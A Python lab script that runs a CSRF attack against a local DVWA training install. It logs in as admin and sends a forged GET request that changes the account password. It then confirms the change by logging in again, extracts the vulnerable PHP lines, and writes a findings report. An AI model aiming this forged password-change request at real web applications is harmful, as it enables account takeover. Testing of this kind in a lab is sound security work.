import requests
from bs4 import BeautifulSoup

# Configuration
DVWA_URL = 'http://localhost/dvwa/'
LOGIN_URL = 'http://localhost/dvwa/login.php'
CSRF_VULN_URL = 'http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change'
REPORT_FILE = '4csrfoutput.txt'
DVWA_PATH = r'C:\xampp\htdocs\dvwa\vulnerabilities\csrf\source\medium.php'

# DVWA Credentials
USERNAME = 'admin'
PASSWORD = 'admin'
NEW_PASSWORD = 'password'

# Your session ID from the browser
SESSION_ID = '8j076meeafjfigef0e8e91onnn'  # Replace with your actual session ID

def login_to_dvwa(session, username, password):
    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.content, 'html.parser')

    # Extract CSRF token
    csrf_token_input = soup.find('input', {'name': 'user_token'})
    csrf_token = csrf_token_input['value'] if csrf_token_input else None

    if not csrf_token:
        print('CSRF token not found in the login page HTML')
        return False

    # Login data
    login_data = {
        'username': username,
        'password': password,
        'Login': 'Login',
        'user_token': csrf_token
    }

    # Perform login
    response = session.post(LOGIN_URL, data=login_data)

    if 'Login failed' in response.text:
        print('Login failed')
        return False

    return True

def perform_csrf_attack(session):
    # Perform the CSRF attack by visiting the crafted URL
    response = session.get(CSRF_VULN_URL)

    # Debug: Log the response status and text
    print(f'Response status code: {response.status_code}')
    print(f'Response text: {response.text[:200]}')  # Print the first 200 characters of the response

    # Try to login with the new password to verify the attack success
    if login_to_dvwa(session, USERNAME, NEW_PASSWORD):
        return CSRF_VULN_URL, 'CSRF attack successful, password changed', True
    else:
        return CSRF_VULN_URL, 'CSRF token is correct but password change failed', False

def extract_vulnerable_csrf_code(file_path):
    vulnerable_lines = []
    with open(file_path, 'r') as file:
        lines = file.readlines()
        for i, line in enumerate(lines, start=1):
            if "password_new" in line or "password_conf" in line or "UPDATE `users` SET password" in line:
                vulnerable_lines.append((i, line.strip()))
    return vulnerable_lines

def write_report(results, vulnerable_code):
    with open(REPORT_FILE, 'w') as report_file:
        report_file.write('DVWA CSRF Vulnerability Report\n')
        report_file.write('='*40 + '\n')

        for url, (test_scenario, success) in results.items():
            report_file.write(f'Target URL: {url}\n')
            report_file.write(f'Test Scenario: {test_scenario}\n')
            report_file.write(f'Success: {success}\n')
            if success:
                report_file.write('Vulnerability Detected:\n')
                report_file.write('The CSRF vulnerability exists because the application does not properly validate the CSRF token, allowing unauthorized actions.\n')
            else:
                report_file.write('No vulnerability detected.\n')
            report_file.write('='*40 + '\n\n')

        # Append the vulnerable PHP code with line numbers
        report_file.write('Vulnerable CSRF Code in PHP File:\n')
        report_file.write('='*40 + '\n')

        for line_number, code_line in vulnerable_code:
            report_file.write(f'Line {line_number}: {code_line}\n')
            report_file.write('Reason: CSRF vulnerability. The CSRF token is not properly validated.\n')

        report_file.write('='*40 + '\n')

def run_csrf_vulnerability_tests():
    session = requests.Session()

    # Set the session ID cookie
    session.cookies.set('PHPSESSID', SESSION_ID)

    if not login_to_dvwa(session, USERNAME, PASSWORD):
        return

    results = {}

    # Perform the CSRF attack
    target_url, test_scenario, success = perform_csrf_attack(session)
    results[target_url] = (test_scenario, success)

    # Extract vulnerable CSRF code from the PHP file
    vulnerable_code = extract_vulnerable_csrf_code(DVWA_PATH)

    write_report(results, vulnerable_code)
    print(f'Report generated: {REPORT_FILE}')

# Entry point of the script
if __name__ == '__main__':
    run_csrf_vulnerability_tests()
